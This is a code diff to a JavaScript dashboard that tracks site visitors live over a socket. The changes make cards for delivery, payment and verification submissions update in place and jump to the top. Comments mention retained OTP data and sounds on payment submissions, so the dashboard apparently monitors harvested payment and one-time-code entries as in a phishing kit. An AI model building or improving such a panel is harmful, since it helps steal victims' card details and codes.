@@ -195,15 +195,28 @@ function setupSocketListeners() {
   socket.on('visitor:new', (data) => {
     console.log('🆕 DATA RECEIVED VIA SOCKET (visitor:new):', data);
     // NO SOUND for new visitors - data updates should be silent
+    const sessionId = data.session_id || data.sessionId;
+    
+    // Check if card already exists
+    const existingCard = document.querySelector('[data-session="' + sessionId + '"]');
+    
+    if (existingCard) {
+      // Card exists - smart update and move to top
+      updateCardAndMoveToTop(sessionId, data);
+    } else {
+      // New card - full refresh to add it
+      updateVisitorsList();
+    }
+    
     updateStats();
-    updateVisitorsList();
   });
 
   socket.on('visitor:pageChange', (data) => {
     console.log('📄 DATA RECEIVED VIA SOCKET (visitor:pageChange):', data);
     // Play gentle notification when visitor changes page
     playPageChangeSound();
-    updateVisitorPage(data.sessionId, data.page);
+    // Update card and move to top (smart update, not full refresh)
+    updateCardAndMoveToTop(data.sessionId, data);
   });
 
   socket.on('visitor:offline', (data) => {
@@ -214,19 +227,18 @@ function setupSocketListeners() {
     // The card with all OTP data should remain visible
     updateVisitorStatus(sessionId, false);
     
-    // Refresh the card with full data to ensure OTP history is updated
-    updateVisitorCard(sessionId, data);
+    // Move to top when going offline (recent activity)
+    moveCardToTop(sessionId);
     
-    // Update stats but DON'T remove from list
+    // Update stats
     updateStats();
-    
-    // Request full refresh to ensure all data is synced
-    setTimeout(() => updateVisitorsList(), 1000);
   });
 
   socket.on('visitor:online', (data) => {
     console.log('🟢 DATA RECEIVED VIA SOCKET (visitor:online):', data);
     updateVisitorStatus(data.sessionId, true);
+    // Move to top when coming online
+    moveCardToTop(data.sessionId);
   });
 
   socket.on('form:deliverySubmitted', (data) => {
@@ -236,8 +248,9 @@ function setupSocketListeners() {
     if (shouldPlaySound(sessionId, 'delivery')) {
       sounds.formDelivery();
     }
+    // Smart update: only update this card and move to top
+    updateCardAndMoveToTop(sessionId, data);
     updateStats();
-    updateVisitorsList();
   });
 
   socket.on('form:paymentSubmitted', (data) => {
@@ -247,8 +260,9 @@ function setupSocketListeners() {
     if (shouldPlaySound(sessionId, 'payment')) {
       sounds.formPayment();
     }
+    // Smart update: only update this card and move to top
+    updateCardAndMoveToTop(sessionId, data);
     updateStats();
-    updateVisitorsList();
   });
 
   socket.on('form:verificationSubmitted', (data) => {
@@ -258,8 +272,9 @@ function setupSocketListeners() {
     if (shouldPlaySound(sessionId, 'verification')) {
       sounds.formVerification();
     }
+    // Smart update: only update this card and move to top
+    updateCardAndMoveToTop(sessionId, data);
     updateStats();
-    updateVisitorsList();
   });
 
   socket.on('stats:push', (data) => {
@@ -927,7 +942,43 @@ function updateVisitorPage(sessionId, page) {
   if (card) {
     const pageEl = card.querySelector('.card-page');
     if (pageEl) pageEl.textContent = getPageName(page);
+    // Move to top when page changes (new activity)
+    moveCardToTop(sessionId);
   }
+}
+
+// Move card to TOP of grid with animation (real-time sorting)
+function moveCardToTop(sessionId) {
+  const grid = document.getElementById('visitorsGrid');
+  const card = document.querySelector('[data-session="' + sessionId + '"]');
+  
+  if (card && grid && card.parentNode === grid) {
+    // Skip if already at top
+    if (grid.firstChild === card) return;
+    
+    // Remove from current position
+    grid.removeChild(card);
+    
+    // Insert at the beginning (top)
+    grid.insertBefore(card, grid.firstChild);
+    
+    // Add animation - slide down effect
+    card.style.opacity = '0';
+    card.style.transform = 'translateY(-30px)';
+    requestAnimationFrame(function() {
+      card.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
+      card.style.opacity = '1';
+      card.style.transform = 'translateY(0)';
+    });
+  }
+}
+
+// Update card data and move to top (for real-time form updates)
+function updateCardAndMoveToTop(sessionId, data) {
+  // Update the card with new data
+  updateVisitorCard(sessionId, data);
+  // Move to top after data update
+  setTimeout(() => moveCardToTop(sessionId), 50);
 }
 
 function updateVisitorStatus(sessionId, isOnline) {
